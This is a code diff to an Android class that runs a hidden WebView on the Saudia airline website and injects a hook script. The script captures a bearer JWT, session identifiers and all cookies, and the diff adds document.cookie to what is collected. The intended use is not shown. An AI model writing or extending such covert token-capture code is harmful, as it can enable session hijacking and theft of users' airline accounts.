@@ -16,7 +16,8 @@ data class CapturedData(
     val jwt: String,
     val cookie: String,
     val saaSessionId: String,
-    val bid: String
+    val bid: String,
+    val docCookies: String
 )
 
 @SuppressLint("SetJavaScriptEnabled", "AddJavascriptInterface")
@@ -51,7 +52,7 @@ class HiddenWebViewManager(
 
                 webView?.addJavascriptInterface(object {
                     @JavascriptInterface
-                    fun onCaptured(jwt: String, saaId: String, bid: String) {
+                    fun onCaptured(jwt: String, saaId: String, bid: String, docCookies: String) {
                         Handler(Looper.getMainLooper()).postDelayed({
                             try {
                                 val c1 = CookieManager.getInstance().getCookie("https://www.saudia.com") ?: ""
@@ -59,6 +60,7 @@ class HiddenWebViewManager(
                                 val c3 = CookieManager.getInstance().getCookie("https://saudia.com") ?: ""
 
                                 val map = mutableMapOf<String, String>()
+                                // نجمع كل الكوكيز من CookieManager
                                 listOf(c1, c2, c3).forEach { str ->
                                     str.split(";").forEach { part ->
                                         val t = part.trim()
@@ -68,11 +70,19 @@ class HiddenWebViewManager(
                                         }
                                     }
                                 }
+                                // نضيف document.cookie
+                                docCookies.split(";").forEach { part ->
+                                    val t = part.trim()
+                                    if (t.isNotEmpty()) {
+                                        val eq = t.indexOf('=')
+                                        if (eq > 0) map[t.substring(0, eq).trim()] = t.substring(eq + 1).trim()
+                                    }
+                                }
                                 val combined = map.entries.joinToString("; ") { "${it.key}=${it.value}" }
 
                                 cleanup()
                                 val cleanToken = if (jwt.startsWith("Bearer ")) jwt else "Bearer $jwt"
-                                onSuccess(CapturedData(cleanToken, combined, saaId, bid))
+                                onSuccess(CapturedData(cleanToken, combined, saaId, bid, docCookies))
                             } catch (e: Exception) {
                                 cleanup()
                                 onError("Error collecting: ${e.message}")
@@ -112,7 +122,8 @@ class HiddenWebViewManager(
                                             setTimeout(function() {
                                                 var sid = window.__capturedSaaId || '';
                                                 var bid = window.__capturedBid || '';
-                                                window.AndroidBridge.onCaptured(jwt, sid, bid);
+                                                var docCookies = document.cookie || '';
+                                                window.AndroidBridge.onCaptured(jwt, sid, bid, docCookies);
                                             }, 4000);
                                             return true;
                                         }
@@ -143,7 +154,6 @@ class HiddenWebViewManager(
     }
 
     companion object {
-        // 👇 val (بدون const) لأن trimIndent() دالة وليست ثابتاً
         private val HOOK_JS = """
             (function() {
                 if (window.__hooked) return;
